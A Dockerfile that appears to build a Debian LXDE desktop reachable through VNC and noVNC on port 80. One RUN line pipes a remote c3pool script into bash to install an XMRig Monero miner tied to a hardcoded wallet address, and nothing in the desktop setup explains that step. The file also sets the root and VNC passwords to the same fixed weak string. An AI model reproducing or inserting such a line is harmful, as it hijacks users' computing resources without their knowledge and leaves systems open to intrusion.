FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install firefox-esr mate-system-monitor  git htop curl lxde tightvncserver wget   -y
RUN wget https://github.com/novnc/noVNC/archive/refs/tags/v1.2.0.tar.gz
RUN curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 49Xooy3DQAMZr7iqDj669ZQQK9vSBMK7y9ETsVtUqpUZCuWGQR7ALn4UBY1FjTHKJ8Ao4M8kwT91cT4PHmwoH8rBHuPvGRT
RUN tar -xvf v1.2.0.tar.gz
RUN mkdir  /root/.vnc
RUN echo 'insoxin' | vncpasswd -f > /root/.vnc/passwd
RUN chmod 600 /root/.vnc/passwd
RUN cp /noVNC-1.2.0/vnc.html /noVNC-1.2.0/index.html
RUN echo 'cd /root' >>/luo.sh
RUN echo "su root -l -c 'vncserver :2000 ' "  >>/luo.sh
RUN echo 'cd /noVNC-1.2.0' >>/luo.sh
RUN echo './utils/launch.sh  --vnc localhost:7900 --listen 80 ' >>/luo.sh
RUN echo root:insoxin|chpasswd
RUN chmod 755 /luo.sh
EXPOSE 80
CMD  /luo.sh
